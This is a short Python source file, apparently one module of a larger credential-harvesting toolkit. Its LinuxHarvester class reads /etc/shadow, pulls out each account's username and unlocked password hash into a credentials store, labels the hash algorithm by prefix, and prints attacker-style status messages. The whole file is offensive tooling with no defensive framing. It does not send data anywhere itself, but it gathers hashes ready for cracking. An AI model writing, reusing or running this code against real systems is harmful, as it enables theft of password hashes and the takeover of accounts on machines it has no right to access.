"""
Linux-specific credential harvesting
"""

from ..core.utils import safe_read_file


class LinuxHarvester:
    """Harvest Linux-specific credentials"""
    
    def __init__(self, credentials: dict):
        self.credentials = credentials
    
    def harvest_shadow(self):
        """Attempt to read /etc/shadow file"""
        print("[*] Attempting to read /etc/shadow...")
        
        content = safe_read_file('/etc/shadow')
        
        if content is None:
            print("  [-] Permission denied (need root)")
            return False
        
        print("[+] Successfully read /etc/shadow")
        
        # Parse shadow file
        for line in content.split('\n'):
            if line and not line.startswith('#'):
                parts = line.split(':')
                if len(parts) >= 2:
                    username = parts[0]
                    password_hash = parts[1]
                    
                    if password_hash and password_hash not in ['*', '!', '!!']:
                        self.credentials['hashes'].append({
                            'source': '/etc/shadow',
                            'username': username,
                            'hash': password_hash,
                            'type': self._identify_hash_type(password_hash)
                        })
                        print(f"  [+] Found hash for: {username}")
        
        return True
    
    def _identify_hash_type(self, hash_string: str) -> str:
        """Identify hash algorithm from format"""
        hash_types = {
            '$1$': 'MD5',
            '$2a$': 'bcrypt',
            '$2y$': 'bcrypt',
            '$5$': 'SHA-256',
            '$6$': 'SHA-512',
            '$y$': 'yescrypt'
        }
        
        for prefix, hash_type in hash_types.items():
            if hash_string.startswith(prefix):
                return hash_type
        
        return 'Unknown'